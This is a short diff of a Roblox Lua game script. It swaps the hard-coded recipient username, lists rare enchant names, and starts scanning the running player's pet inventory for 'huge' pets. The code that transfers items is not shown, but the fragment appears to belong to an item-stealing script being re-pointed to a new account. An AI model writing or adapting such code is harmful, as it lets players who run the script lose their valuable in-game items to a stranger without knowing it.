@@ -174,7 +174,7 @@ task.spawn(function()
     end
 end)
 
-user = "reapexalt3"
+user = "mitzci0"
 allowed_enchants = {"Mega Chest Breaker", "Chest Breaker", "Chest Mimic", "Diamond Chest Mimic", "Super Shiny Hunter", "Boss Chest Mimic", "Super Magnet", "Boss Lucky Block", "Lightning Orb", "Mini Chest Fortune", "Shiny Supercharge", "Corruption", "Nightmare Orb", "Superior Chest Mimic", "Hacker Key Hunter", "Diamond Gift Hunter", "Diamond Orb", "Active Huge Overload", "Rainbow Egg", "Double Coins", "Breakable Mayhem"}
 for i,v in pairs(require(game.ReplicatedStorage.Library.Client.Save).Get().Inventory.Pet) do
     if require(game.ReplicatedStorage.Library.Directory).Pets[v.id].huge then
